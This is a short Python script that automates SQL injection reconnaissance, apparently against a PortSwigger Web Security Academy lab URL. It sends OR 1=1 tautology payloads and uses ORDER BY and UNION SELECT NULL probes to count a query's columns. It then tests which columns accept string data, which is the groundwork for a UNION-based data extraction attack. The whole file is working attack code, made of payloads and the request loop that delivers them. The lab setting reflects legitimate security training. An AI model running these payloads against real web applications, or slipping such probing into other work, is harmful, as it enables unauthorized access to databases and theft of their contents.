

import requests 


ORpayloads = ["' OR 1=1 -- ",
         "' OR '1'='1 -- "   ]


ORDERpayloads = ["' ORDER BY "] # ' ORDER BY 1/2/3/4 -- 

# " abc adasa dwwd abc "
def replaceNth(s, source, target, n):
    inds = [i for i in range(len(s) - len(source)+1) if s[i:i+len(source)]==source]
    if len(inds) < n:
        return  # or maybe raise an error
    s = list(s)  # can't assign to string slices. So, let's listify
    s[inds[n-1]:inds[n-1]+len(source)] = target  # do n-1 because we start from the first occurrence of the string, not the 0-th
    return ''.join(s)


def or_injection(url):
    print("Trying Error Based Injection with OR Payloads ...")
    for i in range(0,len(ORpayloads)):
        r = requests.get(url+ORpayloads[i])
        if r.status_code == 200:
            print("{} worked".format(url + ORpayloads[i]))


def order_injection(url):
    print("Trying number of columns with ORDER BY ...")
    for i in range(1,50):
        query = ORDERpayloads[0] + str(i) + " -- "
        r = requests.get(url + query)
        if r.status_code == 200:
            print("Column {} is present".format(i))
        else:
            print("Total Number of columns are {} ".format(i-1))
            return i-1


def null_injection(url):
    print("Trying number of columns with NULL ...")
    # ' UNION SELECT NULL*i -- 
    for i in range(1,50):
        query = "NULL,"*i
        query = query[0:-1]
        r = requests.get(url + "' UNION SELECT "+ query + " -- ")
        if r.status_code == 500:
            print("Column {} gave 500 internal error".format(i))
        elif r.status_code == 200:
            print("Total Number of columns are {}".format(i))
            return i


def stringcolumn(url,n):
    print("Trying which column contain string type ...")
    query = "NULL,"*n
    query = query[0:-1]
    # ' UNION SELECT 'a',NULL --
    for i in range(1,n+1):

        fullurl = replaceNth(query,"NULL","'a'",i)
        print(url + "' UNION SELECT " + fullurl + " -- ")
        r = requests.get(url + "' UNION SELECT " + fullurl + " -- ")
        if r.status_code == 200:
            print("Column {} is string type".format(i))
        else:
            pass


url = 'https://ac3a1fca1e28522d8025001100780068.web-security-academy.net/filter?category=Pets'
cols = order_injection(url)
stringcolumn(url,cols)

